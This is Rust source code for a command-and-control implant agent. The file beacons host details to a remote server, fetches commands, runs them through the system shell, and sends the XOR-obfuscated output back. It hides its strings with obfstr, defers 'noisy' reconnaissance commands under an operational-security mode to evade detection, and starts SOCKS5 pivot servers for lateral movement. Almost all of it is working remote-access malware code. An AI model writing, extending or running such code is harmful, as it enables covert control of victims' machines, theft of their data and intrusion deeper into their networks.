use crate::commands::obfuscated::{xor_obfuscate};
use crate::config::AgentConfig;
use crate::networking::egress::get_egress_ip;
use crate::networking::socks5_pivot::Socks5PivotHandler;
use crate::networking::socks5_pivot_server::Socks5PivotServer;
use crate::opsec::{AgentMode, determine_agent_mode};
use crate::util::random_jitter;
use get_if_addrs::get_if_addrs;
use hostname;
use log::{info, error, debug, warn};
use once_cell::sync::Lazy;
use os_info;
use reqwest::StatusCode;
use serde_json::json;
use std::collections::HashMap;
use std::env;
use std::io;
use std::path::Path;
use std::process::Command;
use std::sync::Arc;
use std::sync::Mutex;
use std::time::{Duration};
use tokio::sync::Mutex as TokioMutex;
use tokio::sync::mpsc;
use tokio::task::JoinHandle;
use tokio::time::timeout;
use obfstr::obfstr;
use serde::Deserialize;

static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));
static QUEUED_COMMANDS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::new()));

// Define the expected structure for the command response JSON
#[derive(Deserialize)]
struct CommandResponse {
    command: String,
}

//  Helper function to get current timestamp
fn now_timestamp() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

#[cfg(windows)]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new("cmd");
    cmd.arg("/C").arg(command);
    cmd.args(args);
    cmd
}

#[cfg(not(windows))]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new(command);
    cmd.args(args);
    cmd
}

fn get_all_local_ips() -> Vec<String> {
    let mut ips = Vec::new();
    if let Ok(ifaces) = get_if_addrs() {
        for iface in ifaces {
            match iface.addr.ip() { // Use .ip() to get the IpAddr
                std::net::IpAddr::V4(ipv4) => {
                    if !ipv4.is_loopback() && !ipv4.is_multicast() {
                        ips.push(ipv4.to_string());
                    }
                }
                std::net::IpAddr::V6(ipv6) => {
                    if !ipv6.is_loopback() && !ipv6.is_multicast() {
                        ips.push(ipv6.to_string());
                    }
                }
            }
        }
    }
    ips
}

async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
    if cmd_parts.is_empty() {
        return Ok(String::new());
    }

    // Handle cd command specially
    if cmd_parts[0] == "cd" {
        if let Some(dir) = cmd_parts.get(1) {
            let path = Path::new(dir);
            if path.exists() {
                env::set_current_dir(path)?;
                return Ok(format!("Changed directory to {}", env::current_dir()?.display()));
            } else {
                return Err(io::Error::new(io::ErrorKind::NotFound, "Directory not found"));
            }
        }
        return Ok(format!("Current directory: {}", env::current_dir()?.display()));
    }

    // Handle other commands with timeout
    let result = timeout(Duration::from_secs(30), async {
        let output = if cfg!(windows) {
            let full_command = cmd_parts.join(" ");
            create_command(&full_command, &[]).output()?
        } else {
            create_command(cmd_parts[0], &cmd_parts[1..]).output()?
        };

        Ok::<_, io::Error>(format!("{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)))
    }).await;

    match result {
        Ok(Ok(output)) => Ok(output),
        Ok(Err(e)) => Err(e),
        Err(_) => Err(io::Error::new(io::ErrorKind::TimedOut, "Command timed out after 30 seconds"))
    }
}

//  Update C2 failure tracking to use new accessor pattern
fn update_c2_failure_state(success: bool) {
    use crate::opsec::with_opsec_state_mut;
    
    with_opsec_state_mut(|state| {
        if success {
            if state.consecutive_c2_failures > 0 {
                state.consecutive_c2_failures = 0;
                info!("[OPSEC C2] C2 communication restored, reset failure counter");
            }
        } else {
            state.consecutive_c2_failures = state.consecutive_c2_failures.saturating_add(1);
            warn!("[OPSEC C2] C2 communication failed, consecutive failures: {}", state.consecutive_c2_failures);
        }
    });
}

//  Add function to mark noisy command executed
fn mark_noisy_command_executed() {
    use crate::opsec::with_opsec_state_mut;
    
    with_opsec_state_mut(|state| {
        state.last_noisy_command_time = Some(now_timestamp()); //  Use timestamp instead of Instant
    });
}

// Send heartbeat to the server
pub async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<()> {
    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/heartbeat").to_string().replace("{}", agent_id));
    info!("[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
    
    let client = match config.build_http_client() {
        Ok(client) => client,
        Err(e) => {
            error!("[HTTP] Failed to build HTTP client: {}", e);
            update_c2_failure_state(false);
            return Err(e);
        }
    };
    
    let os = os_info::get();
    let hostname = hostname::get()?
        .to_string_lossy()
        .to_string();
    let ip_list = get_all_local_ips();
    let ip = if ip_list.is_empty() { "Unknown".into() } else { ip_list.join(",") };
    let egress_ip = get_egress_ip(server_addr);

    let data = json!({
        "id": agent_id,
        "os": os.os_type().to_string(),
        "hostname": hostname,
        "ip": ip,
        "ip_list": ip_list,
        "egress_ip": egress_ip,
        "commands": Vec::<String>::new()
    });

    match client.post(&url).json(&data).send().await {
        Ok(response) => {
            info!("[HTTP] Heartbeat response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
            if response.status().is_success() {
                update_c2_failure_state(true); // SUCCESS
                Ok(())
            } else {
                error!("[HTTP] Heartbeat failed with status: {}", response.status());
                update_c2_failure_state(false); // FAILURE
                Err(io::Error::new(io::ErrorKind::Other, "Heartbeat failed"))
            }
        }
        Err(e) => {
            error!("[HTTP] Heartbeat POST failed: {}", e);
            update_c2_failure_state(false); // FAILURE
            Err(io::Error::new(io::ErrorKind::Other, e))
        }
    }
}

// Fetch command from the server
async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/command").to_string().replace("{}", agent_id));
    info!("[HTTP] Sending command GET to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
    
    let client = match config.build_http_client() {
        Ok(client) => client,
        Err(e) => {
            error!("[HTTP] Failed to build HTTP client: {}", e);
            update_c2_failure_state(false);
            return Err(e);
        }
    };

    match client.get(&url).send().await {
        Ok(response) => {
            info!("[HTTP] Command GET response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
            if response.status() == StatusCode::NO_CONTENT {
                update_c2_failure_state(true); // SUCCESS (no command)
                return Ok(None);
            }
            if response.status().is_success() {
                // Attempt to parse JSON. If it fails, it's still a C2 communication failure *semantically*.
                match response.json::<CommandResponse>().await {
                    Ok(cmd_resp) => {
                        update_c2_failure_state(true); // SUCCESS
                        Ok(Some(cmd_resp.command))
                    }
                    Err(e) => {
                        error!("[HTTP] Failed to parse command response JSON: {}", e);
                        update_c2_failure_state(false); // FAILURE (bad JSON)
                        Err(io::Error::new(io::ErrorKind::InvalidData, "Invalid JSON response"))
                    }
                }
            } else {
                error!("[HTTP] Command fetch failed with status: {}", response.status());
                update_c2_failure_state(false); // FAILURE (bad HTTP status)
                Err(io::Error::new(io::ErrorKind::Other, "Command fetch failed"))
            }
        }
        Err(e) => {
            error!("[HTTP] Command GET failed: {}", e);
            update_c2_failure_state(false); // FAILURE
            Err(io::Error::new(io::ErrorKind::Other, e))
        }
    }
}

// Submit result to the server
async fn submit_result_with_client(
    config: &AgentConfig,
    server_addr: &str,
    agent_id: &str,
    command: &str,
    output: &str
) -> io::Result<()> {
    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/result").to_string().replace("{}", agent_id));
    info!("[HTTP] Sending result POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
    
    let client = match config.build_http_client() {
        Ok(client) => client,
        Err(e) => {
            error!("[HTTP] Failed to build HTTP client: {}", e);
            update_c2_failure_state(false);
            return Err(e);
        }
    };
    
    let obfuscated_output = xor_obfuscate(output, agent_id);
    let data = json!({
        "command": command,
        "output": obfuscated_output
    });

    match client.post(&url).json(&data).send().await {
        Ok(response) => {
            info!("[HTTP] Result POST response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
            if response.status().is_success() {
                update_c2_failure_state(true); // SUCCESS
                Ok(())
            } else {
                error!("[HTTP] Result submission failed with status: {}", response.status());
                update_c2_failure_state(false); // FAILURE
                Err(io::Error::new(io::ErrorKind::Other, "Result submission failed"))
            }
        }
        Err(e) => {
            error!("[HTTP] Result POST failed: {}", e);
            update_c2_failure_state(false); // FAILURE
            Err(io::Error::new(io::ErrorKind::Other, e))
        }
    }
}

fn is_weak_command(cmd: &str) -> bool {
    let quiet = [
        obfstr!("ping").to_string(),
        obfstr!("echo").to_string(),
    ];
    quiet.iter().any(|q| cmd.starts_with(q))
}

fn is_strong_command(cmd: &str) -> bool {
    let noisy = [
        obfstr!("screenshot").to_string(),
        obfstr!("scan").to_string(),
        obfstr!("upload").to_string(),
        obfstr!("download").to_string(),
        obfstr!("ls").to_string(),
        obfstr!("ps").to_string(),
        obfstr!("netstat").to_string(),
        obfstr!("ifconfig").to_string(),
        obfstr!("whoami").to_string(),
        obfstr!("uname").to_string(),
        obfstr!("cat").to_string(),
    ];
    noisy.iter().any(|n| cmd.starts_with(n))
}

// Check if the command should be executed based on the current opsec mode
// This function now only queues, execution logic is in agent_loop
fn should_queue_command(cmd: &str) -> bool {
    let mode = determine_agent_mode(&crate::config::AgentConfig::load().unwrap_or_default());
    debug!("[OPSEC] should_queue_command: mode={:?}, cmd={}", mode, cmd);
    match mode {
        AgentMode::FullOpsec | AgentMode::ReducedActivity => {
            info!("[OPSEC] Queueing command '{}' (mode: {:?})", cmd, mode);
            true // Queue the command
        }
        AgentMode::BackgroundOpsec => {
            if is_weak_command(cmd) {
                info!("[OPSEC] Weak command '{}' allowed in BackgroundOpsec", cmd);
                false // Execute immediately
            } else {
                info!("[OPSEC] Strong command '{}' queued in BackgroundOpsec", cmd);
                true // Queue the command
            }
        }
    }
}

// Main function to run the shell
pub async fn agent_loop(
    server_addr: &str,
    agent_id: &str,
    _pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>, // Prefix with underscore
    _pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>, // Prefix with underscore
) -> Result<(), Box<dyn std::error::Error>> {
    let config = AgentConfig::load()?;
    info!("[SHELL] Entering agent_loop (BackgroundOpsec Active)");
    // Initial heartbeat for this active period
    // Use a separate Result variable to avoid breaking loop on first heartbeat failure
    let initial_heartbeat_result = send_heartbeat_with_client(&config, server_addr, agent_id).await;
    if let Err(e) = initial_heartbeat_result {
        error!("[SHELL] Initial heartbeat failed: {}. Returning to main loop for OPSEC re-assessment.", e);
        // No need to break explicitly, loop condition will handle it if state changed due to failure
    }

    loop {
        // Determine current OPSEC mode *before* acting
        let current_mode = determine_agent_mode(&config);

        // If no longer in BackgroundOpsec, exit agent_loop immediately
        if current_mode != AgentMode::BackgroundOpsec {
            info!("[SHELL] Mode changed to {:?}, exiting agent_loop", current_mode);
            break;
        }

        // Still in BackgroundOpsec, proceed with C2 communication
        let sleep_time = random_jitter(config.sleep_interval, config.jitter);
        info!("[SHELL] Polling for commands (Interval: {}s)", sleep_time);
        
        match get_command_with_client(&config, server_addr, agent_id).await {
            Ok(Some(command)) => {
                info!("[SHELL] Received command: {}", command);
                
                // Check if we should queue this command or execute immediately
                if should_queue_command(&command) {
                    // Queue the command using safe mutex
                    match crate::safe_mutex::with_lock_mut(&QUEUED_COMMANDS, |queue| {
                        queue.push(command.clone());
                        queue.len()
                    }) {
                        Ok(queue_len) => {
                            info!("[OPSEC] Command '{}' queued (total queued: {})", command, queue_len);
                        }
                        Err(e) => {
                            error!("[OPSEC] Failed to queue command: {}", e);
                        }
                    }
                } else {
                    // Execute immediately (only weak commands in BackgroundOpsec)
                    info!("[SHELL] Executing weak command immediately: {}", command);
                    let cmd_parts: Vec<&str> = command.split_whitespace().collect();
                    match execute_command(&cmd_parts).await {
                        Ok(output) => {
                            info!("[SHELL] Command executed successfully");
                            if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
                                error!("[SHELL] Failed to submit result: {}", e);
                            }
                        }
                        Err(e) => {
                            error!("[SHELL] Command execution failed: {}", e);
                            let error_output = format!("Error: {}", e);
                            if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_output).await {
                                error!("[SHELL] Failed to submit error result: {}", e);
                            }
                        }
                    }
                }
            }
            Ok(None) => {
                // No command available, continue polling
                debug!("[SHELL] No command available");
            }
            Err(e) => {
                error!("[SHELL] Failed to get command: {}", e);
                // Continue loop, C2 failure state already updated
            }
        }

        // --- Process Queued Commands --- 
        // Always check and process queue while in BackgroundOpsec
        let mut commands_to_run = Vec::new();
        match crate::safe_mutex::with_lock_mut(&QUEUED_COMMANDS, |queue| {
            commands_to_run.extend(queue.drain(..));
        }) {
            Ok(_) => {},
            Err(e) => {
                error!("[SHELL] Failed to access command queue: {}", e);
            }
        }
        
        if !commands_to_run.is_empty() {
            info!("[SHELL] Processing {} queued commands", commands_to_run.len());
            for command in commands_to_run {
                info!("[SHELL] Executing queued command: {}", command);
                let cmd_parts: Vec<&str> = command.split_whitespace().collect();
                
                //  Mark noisy command execution with timestamp
                if is_strong_command(&command) {
                    mark_noisy_command_executed(); //  Use timestamp instead of Instant
                }
                
                match execute_command(&cmd_parts).await {
                    Ok(output) => {
                        info!("[SHELL] Queued command executed successfully");
                        if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
                            error!("[SHELL] Failed to submit queued command result: {}", e);
                        }
                    }
                    Err(e) => {
                        error!("[SHELL] Queued command execution failed: {}", e);
                        let error_output = format!("Error: {}", e);
                        if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_output).await {
                            error!("[SHELL] Failed to submit queued command error result: {}", e);
                        }
                    }
                }
            }
        }
        // --- End Process Queued Commands ---

        // Sleep before next poll
        debug!("[SHELL] Sleeping for {} seconds...", sleep_time);
        tokio::time::sleep(Duration::from_secs(sleep_time)).await;

        // Outer loop condition will re-evaluate OPSEC mode on next iteration
    }

    Ok(())
}

// Start a pivot server on the specified port
// This function is called when the command "pivot_start <port>" is received
async fn start_pivot_server(
    port: u16,
    pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
    pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
) -> Result<String, String> {
    let mut servers = PIVOT_SERVERS.lock().await;
    if servers.contains_key(&port) {
        return Err(format!("Pivot server already running on port {}", port));
    }
    let server = Socks5PivotServer::new("127.0.0.1".to_string(), port, pivot_tx);
    let handler = pivot_handler.clone();
    let handle = tokio::spawn(async move {
        server.run(handler).await;
    });
    servers.insert(port, handle);
    Ok(format!("Started pivot server on port {}", port))
}

// Stop a pivot server on the specified port
// This function is called when the command "pivot_stop <port>" is received
async fn stop_pivot_server(port: u16) -> Result<String, String> {
    let mut servers = PIVOT_SERVERS.lock().await;
    if let Some(handle) = servers.remove(&port) {
        handle.abort();
        Ok(format!("Stopped pivot server on port {}", port))
    } else {
        Err(format!("No pivot server running on port {}", port))
    }
}

